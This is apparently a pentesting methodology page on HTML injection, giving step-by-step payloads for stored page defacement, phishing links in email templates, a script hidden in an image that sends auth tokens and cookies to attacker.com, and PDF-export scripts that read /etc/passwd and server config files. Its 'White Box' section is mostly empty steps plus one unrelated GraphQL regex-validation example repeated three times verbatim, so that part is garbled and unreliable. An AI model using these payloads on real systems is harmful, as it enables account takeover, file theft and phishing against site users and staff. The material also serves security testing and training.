# HTML Injection

## Check List

## Methodology

### Black Box

#### Stored

{% stepper %}
{% step %}
Go to any page that has a user-editable rich text field ticket or description, comment, bio
{% endstep %}

{% step %}
Enter normal text like `test <b>bold</b>` test and submit
{% endstep %}

{% step %}
View the saved content with another user or in private mode, if bold renders as bold text, limited HTML is allowed
{% endstep %}

{% step %}
Intercept the save/create request with Burp Suite and send to Repeater
{% endstep %}

{% step %}
In the parameter that contains the user input and replace the value with this breakout + overlay payload

```html
"><div style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,1);z-index:2147483647;"></div>
```
{% endstep %}

{% step %}
If ظthe input is already inside a tag wrapped in \<p> use this version

```html
</p><div style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,1);z-index:2147483647;"></div><p>
```
{% endstep %}

{% step %}
Send the request and let the content be saved
{% endstep %}

{% step %}
Log in as a different user or open incognito/private window and visit any page that displays the saved content dashboard, ticket list, profile page, forum thread,&#x20;
{% endstep %}

{% step %}
If the entire screen becomes completely black and nothing is clickable Full visual defacement via Stored HTML Injection with style attribute is confirmed
{% endstep %}

{% step %}
Works on every platform that uses whitelist-based HTML Sanitization and allows the `<style>` attribute on `<div>, <h1>, <b>, <i>, <a>,`&#x20;
{% endstep %}
{% endstepper %}

***

#### **Email HTML Injection** <a href="#bb11" id="bb11"></a>

{% stepper %}
{% step %}
Go to any property valuation, booking request, or contact form that sends user input to an email template
{% endstep %}

{% step %}
Fill the form normally (especially the address or street, city field and intercept the POST request with Burp Suite
{% endstep %}

{% step %}
Send the request to Repeater
{% endstep %}

{% step %}
In the JSON body, locate the address-related fields commonly `street`, `formattedAddress`, address, location, city
{% endstep %}

{% step %}
Replace the street or `formattedAddress` value with your attacker-controlled URL For Example

```json
"street": "https://attacker.com",
"formattedAddress": "https://attacker.com"
```
{% endstep %}

{% step %}
Full example payload works on any similar endpoint

```json
{
  "address": {
    "street": "https://attacker.com",
    "formattedAddress": "https://attacker.com",
    "city": "Click here for your free valuation",
    "postalCode": "https://attacker.com"
  },
  "email": "victim@company.com",
  "name": "Please click the link below"
}
```
{% endstep %}

{% step %}
Send the request – it will succeed (no 403 if the field is not validated)
{% endstep %}

{% step %}
Wait for the confirmation or booking email to be sent to the `admin/agent/staff`
{% endstep %}

{% step %}
When the victim (employee) opens the email, the address field will be rendered as a clickable link pointing to `https://attacker.com`
{% endstep %}

{% step %}
If the victim clicks it Successful Email Template Content Spoofing Phishing via Trusted Domain confirmed
{% endstep %}
{% endstepper %}

***

#### Email Invite Manipulation

{% stepper %}
{% step %}
Log in to your account on `target.com`
{% endstep %}

{% step %}
Navigate to your project settings page
{% endstep %}

{% step %}
Change your **project name** to a payload such as

```html
<img src="https://miro.app.com/v2/resize:fit:720/format:webp/0*y2OAF_DSarBAjihO.jpg">
```
{% endstep %}

{% step %}
Go to the Invite Members section and send an email invitation to any email address you control
{% endstep %}

{% step %}
Open the received email
{% endstep %}

{% step %}
You will notice that the HTML image is rendered **inline in the email body**, proving successful injection
{% endstep %}
{% endstepper %}

***

#### Account Takeover

{% stepper %}
{% step %}
Go to your profile/shop bio or any field that allows limited HTML&#x20;
{% endstep %}

{% step %}
Enter this exact HTML structure and save it

```html
<div class="remote-pagination-container">
<div class="pagination">
<a href="/cloudinary/images/your_image_id?options[delivery_type]=upload">Next page →</a>
</div>
</div>
```
{% endstep %}

{% step %}
Upload any valid image to the site (via avatar, product image, shop banner anywhere that uses `Cloudinary`
{% endstep %}

{% step %}
After upload, grab the image ID from the final URL usually looks like `s--AbCdEfGh--`/v1234567890/image\_name.jpg → your\_image\_id = `s--AbCdEfGh--`)
{% endstep %}

{% step %}
Replace `your_image_id` in the href above with your real Cloudinary image ID
{% endstep %}

{% step %}
Use a hex editor (https://hexed.it or local tool) to open your original image file
{% endstep %}

{% step %}
Go to offset `0x1A` (or any safe location after JPEG headers) and insert your XSS payload exactly like this

```html
<script>fetch('https://attacker.com/steal?token='+localStorage.getItem('auth_token')+'&cookie='+document.cookie)</script>Save the modified image as new file (still valid JPEG)
```
{% endstep %}

{% step %}
Save the modified image as new file (still valid JPEG)
{% endstep %}

{% step %}
Update your bio HTML with the new image ID and exact parameter`options[delivery_type]=upload`
{% endstep %}

{% step %}
Final working bio payload

```html
<div class="remote-pagination-container">
<div class="pagination">
<a href="/cloudinary/images/s--NewMaliciousID--/?options[delivery_type]=upload">Next →</a>
</div>
</div>
```
{% endstep %}

{% step %}
Save the bio and Now go to any victim's shop page or wait for anyone to view your shop/profile
{% endstep %}

{% step %}
When they click the "Next page →" link → `jQuery replaceWith()` loads your raw image bytes via same-origin → your embedded executes → localStorage token + cookies stolen → Account Takeover achieved
{% endstep %}
{% endstepper %}

***

#### Send Message Functionality HTML Injection to Server Side Request Forgery

{% stepper %}
{% step %}
Log into the target site and check if there is a point in the application that sends a message to another user or as an email, and find the Send Message functionality or Email Form
{% endstep %}

{% step %}
Enter a normal email like `test@example.com` and submit the form
{% endstep %}

{% step %}
Intercept the `POST` request with Burp Suite and send to Repeater
{% endstep %}

{% step %}
In the email parameter, replace the value with this exact payload

```javascript
<script>alert(1)</script>
```
{% endstep %}

{% step %}
Send the request and check if the alert pops or if the script renders
{% endstep %}

{% step %}
If no alert but the field allows injection without @ symbol, try a basic HTML breakout
{% endstep %}

{% step %}
Send and refresh the page or view as another user and if Hello renders, HTML Injection confirmed Then escalate with an external image load

```html
hello"><h1><img src="https://miro.medium.com/v2/resize:fit:1400/0*y2OAF_DSarBAjihO.jpg"></h1>
```
{% endstep %}

{% step %}
If the image loads from third-party, SSRF potential confirmed
{% endstep %}

{% step %}
Then use Burp Collaborator for IP exfiltration

```html
hello"><h1><img src="https://*.burpcollaborator.net/hacked.jpg"></h1>
```
{% endstep %}

{% step %}
Submit and check Burp Collaborator for `HTTP/DNS` interactions,if callback received, SSRF + CSRF via IP leak confirmed
{% endstep %}

{% step %}
Test the email parameter on other input endpoints like `/contact`, `/feedback`, `/reset`, `/signup`, or `/profile` as they often reflect input without @ validation
{% endstep %}
{% endstepper %}

***

#### Server File Reading via PDF Export

{% stepper %}
{% step %}
Go to any file upload feature that supports PDF export like reports, invoices, profiles, documents, attachments
{% endstep %}

{% step %}
Upload a normal file with a safe name like `test.pdf`
{% endstep %}

{% step %}
Trigger PDF generation and download the file, open it to confirm filename appears inside
{% endstep %}

{% step %}
Intercept the upload POST request with Burp Suite and send to Repeater
{% endstep %}

{% step %}
In the filename parameter replace the value with this HTML breakout payload

```html
"><h1>XSS Test</h1>
```
{% endstep %}

{% step %}
Send the request and generate a new PDF
{% endstep %}

{% step %}
Open the PDF, if \<h1>XSS Test\</h1> renders As large text, HTML Injection into PDF template confirmed
{% endstep %}

{% step %}
Then escalate with this JavaScript LFI payload (works in `wkhtmltopdf`, `Chrome PDF`, etc.)

```html
"><script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```
{% endstep %}

{% step %}
Or for Windows servers

```html
"><script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///C:/Windows/system.ini");x.send();</script>
```
{% endstep %}

{% step %}
Generate the PDF again and open it, If `/etc/passwd` or `system.ini` contents are printed inside the PDF, Critical Local File Inclusion (LFI) via PDF HTML Injection confirmed
{% endstep %}

{% step %}
Then read other sensitive files

* `file:///etc/hosts`
* `file:///proc/version`
* `file:///var/www/html/config.php`
{% endstep %}
{% endstepper %}

***

#### HTML injection in search UI

{% stepper %}
{% step %}
Log in to the application using a low-privilege user account
{% endstep %}

{% step %}
Access the "`Contacts`" section and initiate the creation of a new Circle
{% endstep %}

{% step %}
When naming the Circle, insert the following payload:

&#x20;`<meta http-equiv="refresh" content="2; https://evil.com/" />`
{% endstep %}

{% step %}
Share the Circle with a user account having an `"Admin"` role
{% endstep %}

{% step %}
Observe that the browser will redirect to a malicious website within a 2-second timeframe
{% endstep %}
{% endstepper %}

***

### White Box

{% stepper %}
{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}


**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:new\s+Regex\s*\([\s\S]{0,120}?(?:constraint|validation|pattern)|Regex\s*\(\s*\w*(?:Pattern|pattern)\w*\s*\)|RegexOptions[\s\S]{0,100}?pattern)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:Pattern\.compile\s*\([\s\S]{0,120}?(?:constraint\.pattern\(\)|pattern|regex)|Pattern\.compile\s*\(\s*\w+\s*\)|javax\.validation.*pattern)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:preg_match\s*\(\s*\$constraint->pattern\s*\(|preg_match\s*\([\s\S]{0,120}?(?:\$pattern|\$regex)|new\s+RegexValidator\s*\([\s\S]{0,100}?pattern)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:new\s+RegExp\s*\(\s*(?:directive\.arguments\.pattern|pattern|regex)[\s\S]{0,80}?\)|RegExp\s*\([\s\S]{0,100}?pattern|\.match\s*\(\s*(?:pattern|regex))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
new\s+Regex\(.*(pattern|constraint)|Regex\(.*pattern
```
{% endtab %}

{% tab title="Java" %}
```regexp
Pattern\.compile\(constraint\.pattern\(\)\)|Pattern\.compile\(.*pattern
```
{% endtab %}

{% tab title="PHP" %}
```regexp
preg_match\(\$constraint->pattern|preg_match\(.*\$pattern
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
new\s+RegExp\(directive\.arguments\.pattern\)|new\s+RegExp\(.*pattern
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class ConstraintValidationMiddleware
{
    private readonly FieldDelegate _next;
    private readonly ConcurrentDictionary<string, Regex> _compiledConstraints = new();

    public ConstraintValidationMiddleware(FieldDelegate next)
    {
        _next = next;
    }

    public async Task InvokeAsync(IMiddlewareContext context)
    {
        // [1]
        // [2]
        var field = context.Selection.Field;
        var constraintDirective = field.Directives.FirstOrDefault(d => d.Name == "constraint");

        if (constraintDirective != null)
        {
            var pattern = constraintDirective.GetArgument<string>("pattern");
            
            // [3]
            var regex = _compiledConstraints.GetOrAdd(field.Name, p => new Regex(p, RegexOptions.Compiled));

            foreach (var argument in context.Selection.SyntaxNode.Arguments)
            {
                var inputString = argument.Value.ToString();
                
                // [4]
                // Blocks the main GraphQL execution pipeline synchronously
                if (!regex.IsMatch(inputString))
                {
                    context.ReportError("Constraint validation failed.");
                    return;
                }
            }
        }

        await _next(context);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
public class ConstraintValidationMiddleware {

    private final FieldDelegate next;

    private final ConcurrentHashMap<String, Pattern> compiledConstraints = new ConcurrentHashMap<>();

    public ConstraintValidationMiddleware(FieldDelegate next) {
        this.next = next;
    }

    public CompletableFuture<Void> invokeAsync(MiddlewareContext context) {

        // [1]
        // [2]
        Field field = context.getSelection().getField();

        Directive constraintDirective = field.getDirectives()
                .stream()
                .filter(d -> d.getName().equals("constraint"))
                .findFirst()
                .orElse(null);

        if (constraintDirective != null) {

            String pattern = constraintDirective.getArgument("pattern");

            // [3]
            Pattern regex = compiledConstraints.computeIfAbsent(
                    field.getName(),
                    p -> Pattern.compile(pattern)
            );

            for (Argument argument : context.getSelection()
                    .getSyntaxNode()
                    .getArguments()) {

                String inputString = argument.getValue().toString();

                // [4]
                // Blocks GraphQL execution pipeline synchronously
                if (!regex.matcher(inputString).matches()) {

                    context.reportError(
                        "Constraint validation failed."
                    );

                    return CompletableFuture.completedFuture(null);
                }
            }
        }

        return next.invoke(context);
    }
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class ConstraintValidationMiddleware
{
    private $next;

    private array $compiledConstraints = [];

    public function __construct(callable $next)
    {
        $this->next = $next;
    }


    public function invokeAsync($context)
    {
        // [1]
        // [2]
        $field = $context->selection->field;

        $constraintDirective = null;

        foreach ($field->directives as $directive) {

            if ($directive->name === "constraint") {
                $constraintDirective = $directive;
                break;
            }
        }


        if ($constraintDirective !== null) {

            $pattern = $constraintDirective
                ->getArgument("pattern");


            // [3]
            if (!isset($this->compiledConstraints[$field->name])) {

                $this->compiledConstraints[$field->name] =
                    $pattern;
            }

            $regex = $this->compiledConstraints[$field->name];


            foreach (
                $context->selection
                    ->syntaxNode
                    ->arguments as $argument
            ) {

                $inputString = (string)$argument->value;


                // [4]
                // Blocks GraphQL execution pipeline synchronously
                if (!preg_match($regex, $inputString)) {

                    $context->reportError(
                        "Constraint validation failed."
                    );

                    return null;
                }
            }
        }


        return call_user_func(
            $this->next,
            $context
        );
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const { ApolloGateway } = require('@apollo/gateway');

class ConstraintValidationPlugin {
    // [1]
    // [2]
    // Executes during Supergraph composition
    requestDidStart({ schema }) {
        const compiledRegexes = new Map();

        // Recursively extract @constraint directives from the composed schema
        Object.values(schema.getTypeMap()).forEach(type => {
            if (type.astNode && type.astNode.directives) {
                const constraint = type.astNode.directives.find(d => d.name.value === 'constraint');
                if (constraint) {
                    const patternArg = constraint.arguments.find(a => a.name.value === 'pattern');
                    if (patternArg) {
                        // [3]
                        // Blindly compiles the Subgraph-provided regex into the Gateway's memory
                        compiledRegexes.set(type.name, new RegExp(patternArg.value.value));
                    }
                }
            }
        });

        return {
            async executionDidStart({ request }) {
                // [4]
                // Intercepts variables BEFORE passing the query to the Subgraph
                for (const [key, value] of Object.entries(request.variables || {})) {
                    const regex = compiledRegexes.get(key); // Simplified type matching for brevity
                    if (regex && !regex.test(value)) {
                        throw new Error(`Validation failed for ${key}`);
                    }
                }
            }
        };
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}
{% endstepper %}

***

{% stepper %}
{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}


**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:new\s+Regex\s*\([\s\S]{0,120}?(?:constraint|validation|pattern)|Regex\s*\(\s*\w*(?:Pattern|pattern)\w*\s*\)|RegexOptions[\s\S]{0,100}?pattern)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:Pattern\.compile\s*\([\s\S]{0,120}?(?:constraint\.pattern\(\)|pattern|regex)|Pattern\.compile\s*\(\s*\w+\s*\)|javax\.validation.*pattern)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:preg_match\s*\(\s*\$constraint->pattern\s*\(|preg_match\s*\([\s\S]{0,120}?(?:\$pattern|\$regex)|new\s+RegexValidator\s*\([\s\S]{0,100}?pattern)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:new\s+RegExp\s*\(\s*(?:directive\.arguments\.pattern|pattern|regex)[\s\S]{0,80}?\)|RegExp\s*\([\s\S]{0,100}?pattern|\.match\s*\(\s*(?:pattern|regex))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
new\s+Regex\(.*(pattern|constraint)|Regex\(.*pattern
```
{% endtab %}

{% tab title="Java" %}
```regexp
Pattern\.compile\(constraint\.pattern\(\)\)|Pattern\.compile\(.*pattern
```
{% endtab %}

{% tab title="PHP" %}
```regexp
preg_match\(\$constraint->pattern|preg_match\(.*\$pattern
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
new\s+RegExp\(directive\.arguments\.pattern\)|new\s+RegExp\(.*pattern
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class ConstraintValidationMiddleware
{
    private readonly FieldDelegate _next;
    private readonly ConcurrentDictionary<string, Regex> _compiledConstraints = new();

    public ConstraintValidationMiddleware(FieldDelegate next)
    {
        _next = next;
    }

    public async Task InvokeAsync(IMiddlewareContext context)
    {
        // [1]
        // [2]
        var field = context.Selection.Field;
        var constraintDirective = field.Directives.FirstOrDefault(d => d.Name == "constraint");

        if (constraintDirective != null)
        {
            var pattern = constraintDirective.GetArgument<string>("pattern");
            
            // [3]
            var regex = _compiledConstraints.GetOrAdd(field.Name, p => new Regex(p, RegexOptions.Compiled));

            foreach (var argument in context.Selection.SyntaxNode.Arguments)
            {
                var inputString = argument.Value.ToString();
                
                // [4]
                // Blocks the main GraphQL execution pipeline synchronously
                if (!regex.IsMatch(inputString))
                {
                    context.ReportError("Constraint validation failed.");
                    return;
                }
            }
        }

        await _next(context);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
public class ConstraintValidationMiddleware {

    private final FieldDelegate next;

    private final ConcurrentHashMap<String, Pattern> compiledConstraints = new ConcurrentHashMap<>();

    public ConstraintValidationMiddleware(FieldDelegate next) {
        this.next = next;
    }

    public CompletableFuture<Void> invokeAsync(MiddlewareContext context) {

        // [1]
        // [2]
        Field field = context.getSelection().getField();

        Directive constraintDirective = field.getDirectives()
                .stream()
                .filter(d -> d.getName().equals("constraint"))
                .findFirst()
                .orElse(null);

        if (constraintDirective != null) {

            String pattern = constraintDirective.getArgument("pattern");

            // [3]
            Pattern regex = compiledConstraints.computeIfAbsent(
                    field.getName(),
                    p -> Pattern.compile(pattern)
            );

            for (Argument argument : context.getSelection()
                    .getSyntaxNode()
                    .getArguments()) {

                String inputString = argument.getValue().toString();

                // [4]
                // Blocks GraphQL execution pipeline synchronously
                if (!regex.matcher(inputString).matches()) {

                    context.reportError(
                        "Constraint validation failed."
                    );

                    return CompletableFuture.completedFuture(null);
                }
            }
        }

        return next.invoke(context);
    }
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class ConstraintValidationMiddleware
{
    private $next;

    private array $compiledConstraints = [];

    public function __construct(callable $next)
    {
        $this->next = $next;
    }


    public function invokeAsync($context)
    {
        // [1]
        // [2]
        $field = $context->selection->field;

        $constraintDirective = null;

        foreach ($field->directives as $directive) {

            if ($directive->name === "constraint") {
                $constraintDirective = $directive;
                break;
            }
        }


        if ($constraintDirective !== null) {

            $pattern = $constraintDirective
                ->getArgument("pattern");


            // [3]
            if (!isset($this->compiledConstraints[$field->name])) {

                $this->compiledConstraints[$field->name] =
                    $pattern;
            }

            $regex = $this->compiledConstraints[$field->name];


            foreach (
                $context->selection
                    ->syntaxNode
                    ->arguments as $argument
            ) {

                $inputString = (string)$argument->value;


                // [4]
                // Blocks GraphQL execution pipeline synchronously
                if (!preg_match($regex, $inputString)) {

                    $context->reportError(
                        "Constraint validation failed."
                    );

                    return null;
                }
            }
        }


        return call_user_func(
            $this->next,
            $context
        );
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const { ApolloGateway } = require('@apollo/gateway');

class ConstraintValidationPlugin {
    // [1]
    // [2]
    // Executes during Supergraph composition
    requestDidStart({ schema }) {
        const compiledRegexes = new Map();

        // Recursively extract @constraint directives from the composed schema
        Object.values(schema.getTypeMap()).forEach(type => {
            if (type.astNode && type.astNode.directives) {
                const constraint = type.astNode.directives.find(d => d.name.value === 'constraint');
                if (constraint) {
                    const patternArg = constraint.arguments.find(a => a.name.value === 'pattern');
                    if (patternArg) {
                        // [3]
                        // Blindly compiles the Subgraph-provided regex into the Gateway's memory
                        compiledRegexes.set(type.name, new RegExp(patternArg.value.value));
                    }
                }
            }
        });

        return {
            async executionDidStart({ request }) {
                // [4]
                // Intercepts variables BEFORE passing the query to the Subgraph
                for (const [key, value] of Object.entries(request.variables || {})) {
                    const regex = compiledRegexes.get(key); // Simplified type matching for brevity
                    if (regex && !regex.test(value)) {
                        throw new Error(`Validation failed for ${key}`);
                    }
                }
            }
        };
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}
{% endstepper %}

***

{% stepper %}
{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}


**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:new\s+Regex\s*\([\s\S]{0,120}?(?:constraint|validation|pattern)|Regex\s*\(\s*\w*(?:Pattern|pattern)\w*\s*\)|RegexOptions[\s\S]{0,100}?pattern)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:Pattern\.compile\s*\([\s\S]{0,120}?(?:constraint\.pattern\(\)|pattern|regex)|Pattern\.compile\s*\(\s*\w+\s*\)|javax\.validation.*pattern)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:preg_match\s*\(\s*\$constraint->pattern\s*\(|preg_match\s*\([\s\S]{0,120}?(?:\$pattern|\$regex)|new\s+RegexValidator\s*\([\s\S]{0,100}?pattern)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:new\s+RegExp\s*\(\s*(?:directive\.arguments\.pattern|pattern|regex)[\s\S]{0,80}?\)|RegExp\s*\([\s\S]{0,100}?pattern|\.match\s*\(\s*(?:pattern|regex))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
new\s+Regex\(.*(pattern|constraint)|Regex\(.*pattern
```
{% endtab %}

{% tab title="Java" %}
```regexp
Pattern\.compile\(constraint\.pattern\(\)\)|Pattern\.compile\(.*pattern
```
{% endtab %}

{% tab title="PHP" %}
```regexp
preg_match\(\$constraint->pattern|preg_match\(.*\$pattern
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
new\s+RegExp\(directive\.arguments\.pattern\)|new\s+RegExp\(.*pattern
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class ConstraintValidationMiddleware
{
    private readonly FieldDelegate _next;
    private readonly ConcurrentDictionary<string, Regex> _compiledConstraints = new();

    public ConstraintValidationMiddleware(FieldDelegate next)
    {
        _next = next;
    }

    public async Task InvokeAsync(IMiddlewareContext context)
    {
        // [1]
        // [2]
        var field = context.Selection.Field;
        var constraintDirective = field.Directives.FirstOrDefault(d => d.Name == "constraint");

        if (constraintDirective != null)
        {
            var pattern = constraintDirective.GetArgument<string>("pattern");
            
            // [3]
            var regex = _compiledConstraints.GetOrAdd(field.Name, p => new Regex(p, RegexOptions.Compiled));

            foreach (var argument in context.Selection.SyntaxNode.Arguments)
            {
                var inputString = argument.Value.ToString();
                
                // [4]
                // Blocks the main GraphQL execution pipeline synchronously
                if (!regex.IsMatch(inputString))
                {
                    context.ReportError("Constraint validation failed.");
                    return;
                }
            }
        }

        await _next(context);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
public class ConstraintValidationMiddleware {

    private final FieldDelegate next;

    private final ConcurrentHashMap<String, Pattern> compiledConstraints = new ConcurrentHashMap<>();

    public ConstraintValidationMiddleware(FieldDelegate next) {
        this.next = next;
    }

    public CompletableFuture<Void> invokeAsync(MiddlewareContext context) {

        // [1]
        // [2]
        Field field = context.getSelection().getField();

        Directive constraintDirective = field.getDirectives()
                .stream()
                .filter(d -> d.getName().equals("constraint"))
                .findFirst()
                .orElse(null);

        if (constraintDirective != null) {

            String pattern = constraintDirective.getArgument("pattern");

            // [3]
            Pattern regex = compiledConstraints.computeIfAbsent(
                    field.getName(),
                    p -> Pattern.compile(pattern)
            );

            for (Argument argument : context.getSelection()
                    .getSyntaxNode()
                    .getArguments()) {

                String inputString = argument.getValue().toString();

                // [4]
                // Blocks GraphQL execution pipeline synchronously
                if (!regex.matcher(inputString).matches()) {

                    context.reportError(
                        "Constraint validation failed."
                    );

                    return CompletableFuture.completedFuture(null);
                }
            }
        }

        return next.invoke(context);
    }
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class ConstraintValidationMiddleware
{
    private $next;

    private array $compiledConstraints = [];

    public function __construct(callable $next)
    {
        $this->next = $next;
    }


    public function invokeAsync($context)
    {
        // [1]
        // [2]
        $field = $context->selection->field;

        $constraintDirective = null;

        foreach ($field->directives as $directive) {

            if ($directive->name === "constraint") {
                $constraintDirective = $directive;
                break;
            }
        }


        if ($constraintDirective !== null) {

            $pattern = $constraintDirective
                ->getArgument("pattern");


            // [3]
            if (!isset($this->compiledConstraints[$field->name])) {

                $this->compiledConstraints[$field->name] =
                    $pattern;
            }

            $regex = $this->compiledConstraints[$field->name];


            foreach (
                $context->selection
                    ->syntaxNode
                    ->arguments as $argument
            ) {

                $inputString = (string)$argument->value;


                // [4]
                // Blocks GraphQL execution pipeline synchronously
                if (!preg_match($regex, $inputString)) {

                    $context->reportError(
                        "Constraint validation failed."
                    );

                    return null;
                }
            }
        }


        return call_user_func(
            $this->next,
            $context
        );
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const { ApolloGateway } = require('@apollo/gateway');

class ConstraintValidationPlugin {
    // [1]
    // [2]
    // Executes during Supergraph composition
    requestDidStart({ schema }) {
        const compiledRegexes = new Map();

        // Recursively extract @constraint directives from the composed schema
        Object.values(schema.getTypeMap()).forEach(type => {
            if (type.astNode && type.astNode.directives) {
                const constraint = type.astNode.directives.find(d => d.name.value === 'constraint');
                if (constraint) {
                    const patternArg = constraint.arguments.find(a => a.name.value === 'pattern');
                    if (patternArg) {
                        // [3]
                        // Blindly compiles the Subgraph-provided regex into the Gateway's memory
                        compiledRegexes.set(type.name, new RegExp(patternArg.value.value));
                    }
                }
            }
        });

        return {
            async executionDidStart({ request }) {
                // [4]
                // Intercepts variables BEFORE passing the query to the Subgraph
                for (const [key, value] of Object.entries(request.variables || {})) {
                    const regex = compiledRegexes.get(key); // Simplified type matching for brevity
                    if (regex && !regex.test(value)) {
                        throw new Error(`Validation failed for ${key}`);
                    }
                }
            }
        };
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
